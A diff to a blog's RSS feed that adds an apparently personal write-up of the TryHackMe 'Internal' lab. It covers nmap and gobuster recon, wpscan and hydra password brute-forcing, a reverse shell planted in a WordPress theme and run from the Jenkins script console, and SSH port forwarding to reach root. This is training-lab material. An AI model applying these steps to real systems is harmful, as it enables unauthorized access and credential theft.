@@ -5,9 +5,187 @@
     <description>Sinameki Sarp&apos;s CTF Writeups and blogposts...</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 05 Dec 2022 23:27:33 +0300</pubDate>
-    <lastBuildDate>Mon, 05 Dec 2022 23:27:33 +0300</lastBuildDate>
+    <pubDate>Wed, 14 Dec 2022 15:13:27 +0300</pubDate>
+    <lastBuildDate>Wed, 14 Dec 2022 15:13:27 +0300</lastBuildDate>
     <generator>Jekyll v4.3.1</generator>
+    
+      <item>
+        <title>TryHackMe: Internal CTF Writeup</title>
+        <description>&lt;p&gt;TryHackMe linux penetration testing challenge machine Internal boot2root walkthrough.&lt;/p&gt;
+&lt;h2 id=&quot;discovery-part&quot;&gt;Discovery Part&lt;/h2&gt;
+
+&lt;p&gt;Start with port scan with Nmap tool.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; 10.10.116.99
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Server has “&lt;strong&gt;ssh&lt;/strong&gt;” and “&lt;strong&gt;web&lt;/strong&gt;” service. Go to web page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%201.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is a default &lt;strong&gt;Apache2&lt;/strong&gt; page. Find directories with &lt;strong&gt;gobuster&lt;/strong&gt; tool.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.116.99/ &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,html,txt
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%202.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Go to &lt;strong&gt;wordpress&lt;/strong&gt; directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%203.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Modify “&lt;strong&gt;/etc/hosts”&lt;/strong&gt; file to reflect &lt;strong&gt;internal.thm&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;nano /etc/hosts
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%204.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%205.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It look like web page maden with &lt;strong&gt;Wordpress.&lt;/strong&gt; Use “&lt;strong&gt;wpscan&lt;/strong&gt;” tool for enumurate informations.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://internal.thm/wordpress/ &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; ap,u
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%206.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;After scan proccess I try to find exploit “&lt;strong&gt;WP v5.4.2&lt;/strong&gt;” but couldn’t find. Then I search any sensitive information in web page but nothing in there.&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%207.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is one user (”&lt;strong&gt;admin&lt;/strong&gt;”) try to find password with bruteforce.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://internal.thm/wordpress/ &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt  &lt;span class=&quot;nt&quot;&gt;--password-attack&lt;/span&gt; wp-login
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%208.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Login wp-login with admin user and password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%209.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2010.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration-part&quot;&gt;Enumeration Part&lt;/h2&gt;
+
+&lt;p&gt;Go to &lt;strong&gt;Apperance&amp;gt;Theme Editor&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2011.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Change one of the “&lt;strong&gt;Theme files&lt;/strong&gt;” to reverse shell code.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2012.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listen your port with netcat tool and…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2013.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Change shell to tty shell. First check which version of python in the system then run python code.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2014.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Find which users in the system. Go to &lt;strong&gt;/home&lt;/strong&gt; directory and list files and directories in the directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2015.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is one user &lt;strong&gt;aubreanna&lt;/strong&gt; however we don’t have a permission to access directory. Go to &lt;strong&gt;/opt&lt;/strong&gt; directory.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2016.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Read &lt;strong&gt;wp-save.txt&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2017.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Login aubreanna user with the credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2018.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilege-escalation-part&quot;&gt;Privilege Escalation Part&lt;/h2&gt;
+
+&lt;p&gt;Read &lt;strong&gt;jenkins.txt&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2019.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We need to “&lt;strong&gt;SSH Port Forward”&lt;/strong&gt; to access &lt;strong&gt;172.17.0.2:8080&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 4545:172.17.0.2:8080 aubreanna@internal.thm
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2020.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Go to “&lt;strong&gt;http://localhost:4545/&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2021.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I try to find credentials but there is no credential info in the server.&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;Find credentials with bruteforce.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
+&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;hydra &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /usr/share/wordlists/rockyou.txt localhost &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 4545 http-post-form &lt;span class=&quot;s2&quot;&gt;&quot;/j_acegi_security_check:j_username=admin&amp;amp;j_password=^PASS^&amp;amp;from=%2F&amp;amp;Submit=Sign+in:loginError&quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2022.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Login admin user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2023.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Select &lt;strong&gt;Manage Jenkins &amp;gt; Script Console.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2024.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this section you can execute &lt;strong&gt;Groovy script.&lt;/strong&gt; Execute Groovy reverse shell code and list port with netcat.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2025.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2026.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Go to /&lt;strong&gt;opt&lt;/strong&gt; directory and read &lt;strong&gt;note.txt&lt;/strong&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2027.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Login root wtih the credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/TryHackMe%20Internal%202d9efd2fd7954708885ceb19538a210b/Untitled%2028.png&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;thank-you-for-reading-&quot;&gt;THANK YOU FOR READING 🙂&lt;/h1&gt;
+</description>
+        <pubDate>Wed, 14 Dec 2022 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/TryHackMe-Internal/</link>
+        <guid isPermaLink="true">http://localhost:4000/TryHackMe-Internal/</guid>
+        
+        <category>red</category>
+        
+        <category>yellow</category>
+        
+        
+        <category>TryHackMe</category>
+        
+        <category>CTF</category>
+        
+        <category>Writeup</category>
+        
+      </item>
     
       <item>
         <title>TryHackMe: Daily Bugle CTF Writeup</title>
